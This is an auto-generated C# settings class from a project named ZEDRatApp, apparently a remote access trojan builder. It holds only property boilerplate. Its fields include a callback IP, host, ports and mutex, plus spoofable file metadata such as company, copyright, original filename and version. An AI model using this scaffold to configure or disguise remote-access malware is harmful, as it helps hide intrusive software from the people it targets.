using System.CodeDom.Compiler;
using System.Configuration;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace ZEDRatApp.Properties
{
	[CompilerGenerated]
	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "16.8.1.0")]
	internal sealed class Settings : ApplicationSettingsBase
	{
		private static Settings defaultInstance = (Settings)SettingsBase.Synchronized(new Settings());

		public static Settings Default => Settings.defaultInstance;

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string Ports
		{
			get
			{
				return (string)this["Ports"];
			}
			set
			{
				this["Ports"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string Filename
		{
			get
			{
				return (string)this["Filename"];
			}
			set
			{
				this["Filename"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string Mutex
		{
			get
			{
				return (string)this["Mutex"];
			}
			set
			{
				this["Mutex"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string IP
		{
			get
			{
				return (string)this["IP"];
			}
			set
			{
				this["IP"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string ProductName
		{
			get
			{
				return (string)this["ProductName"];
			}
			set
			{
				this["ProductName"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string txtDescription
		{
			get
			{
				return (string)this["txtDescription"];
			}
			set
			{
				this["txtDescription"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string txtCompany
		{
			get
			{
				return (string)this["txtCompany"];
			}
			set
			{
				this["txtCompany"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string txtCopyright
		{
			get
			{
				return (string)this["txtCopyright"];
			}
			set
			{
				this["txtCopyright"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string txtTrademarks
		{
			get
			{
				return (string)this["txtTrademarks"];
			}
			set
			{
				this["txtTrademarks"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string txtOriginalFilename
		{
			get
			{
				return (string)this["txtOriginalFilename"];
			}
			set
			{
				this["txtOriginalFilename"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("0.0.0.0")]
		public string txtProductVersion
		{
			get
			{
				return (string)this["txtProductVersion"];
			}
			set
			{
				this["txtProductVersion"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("0.0.0.0")]
		public string txtFileVersion
		{
			get
			{
				return (string)this["txtFileVersion"];
			}
			set
			{
				this["txtFileVersion"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string txtHost
		{
			get
			{
				return (string)this["txtHost"];
			}
			set
			{
				this["txtHost"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("")]
		public string txtFile
		{
			get
			{
				return (string)this["txtFile"];
			}
			set
			{
				this["txtFile"] = value;
			}
		}

		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("True")]
		public bool Notification
		{
			get
			{
				return (bool)this["Notification"];
			}
			set
			{
				this["Notification"] = value;
			}
		}
	}
}
